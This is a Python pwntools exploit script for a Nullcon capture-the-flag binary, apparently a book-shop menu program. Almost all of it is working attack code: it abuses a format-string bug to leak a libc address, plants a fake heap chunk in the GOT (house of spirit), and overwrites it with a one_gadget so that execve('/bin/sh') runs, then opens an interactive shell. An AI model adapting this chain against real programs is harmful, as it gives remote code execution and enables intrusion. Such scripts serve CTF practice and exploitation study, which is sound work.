#!/usr/bin/python
from pwn import *
import sys
from time import sleep

config = {
	"elf" : "./challenge",
	"libc" : "./libc6_2.27-3ubuntu1_amd64.so",
	"HOST" : "pwn.ctf.nullcon.net",
	"PORT" : 4002
}

def add_book(sz, s, price):
	r.sendlineafter("> ", "1")
	r.sendlineafter(": ", str(sz))
	r.sendafter(": ", s)
	r.sendlineafter(": ", str(price))

def remove_book(i):
	r.sendlineafter("> ", "2")
	r.sendlineafter(": ", str(i))

def view_book():
	r.sendlineafter("> ", "3")
	return r.recvuntil("NullCon Shop\n", drop=True)

def exploit(r):

	# leak heap
	add_book(0x10, "AAAA", 10)
	add_book(0x10, "BBBB", 10)
	remove_book(1)
	remove_book(0)
	add_book(0x38, p64(e.got["free"])+p64(0)+p64(0)+"%7$s ", 10)
	leak = view_book().split('"')
	libc_base = u64(leak[25][:6].ljust(8, '\x00'))-libc.symbols["free"]
	log.info("libc_base : 0x{:x}".format(libc_base))

	# house of spirit on free_hook
	"""
		0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
		constraints:
		  rcx == NULL

		0x4f322	execve("/bin/sh", rsp+0x40, environ)
		constraints:
		  [rsp+0x40] == NULL

		0x10a38c	execve("/bin/sh", rsp+0x70, environ)
		constraints:
		  [rsp+0x70] == NULL
	"""

	one_gadget = libc_base+0x4f322
	log.info("one_gadget : 0x{:x}".format(one_gadget))
	add_book(0x10, "AAAA", 10)
	add_book(0x10, "BBBB", 10)

	# setup fake chunk in GOT
	remove_book(2)
	add_book(0x38, p64(0x0000000000602038)+p64(0)+p64(0)+"%{}c%7$n".format(0x71), 10)
	view_book()
	remove_book(2)
	add_book(0x38, p64(0x0000000000602038+0x70)+p64(0x0000000000602038+8)+p64(0)+"%{}c%7$n".format(0x71), 10)
	view_book()

	# free fake chunk in GOT
	a = lambda x : p64(libc_base+libc.symbols[x])
	remove_book(1)

	# trigger one_gadget
	r.sendlineafter("> ", "1")
	r.sendline(str(0x70-8))
	r.send(p64(one_gadget)*10)

	r.interactive()
	return

if __name__ == "__main__":
	
	if "elf" in config.keys() and config["elf"]:
		e = ELF(config["elf"])
	
	if "libc" in config.keys() and config["libc"]:
		libc = ELF(config["libc"])

	if sys.argv[-1] == "remote":
		r = remote(config["HOST"], config["PORT"])
		exploit(r)
	else:
		if "libc" in dir():
			r = process(config["elf"], env={"LD_PRELOAD" : config["libc"]})
		else:
			r = process(config["elf"])
		print util.proc.pidof(r)

		if sys.argv[-1] == "debug":
			pause()
		exploit(r)
